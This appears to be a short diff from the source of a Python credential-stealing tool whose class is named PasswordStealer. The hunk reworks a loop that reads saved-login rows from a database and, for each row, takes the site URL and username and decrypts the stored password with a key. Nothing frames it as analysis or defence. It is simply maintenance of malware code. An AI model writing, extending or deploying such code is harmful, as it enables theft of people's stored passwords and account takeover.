@@ -56,7 +56,7 @@ class PasswordStealer:
             cursor = db.cursor()
             cursor.execute(select_query)
 
-            for i, row in enumerate(cursor.fetchall()):
+            for row in cursor.fetchall():
                 origin_url = row[0] 
                 username = row[2]
                 password = self.decrypt_password(row[3], self.key)   
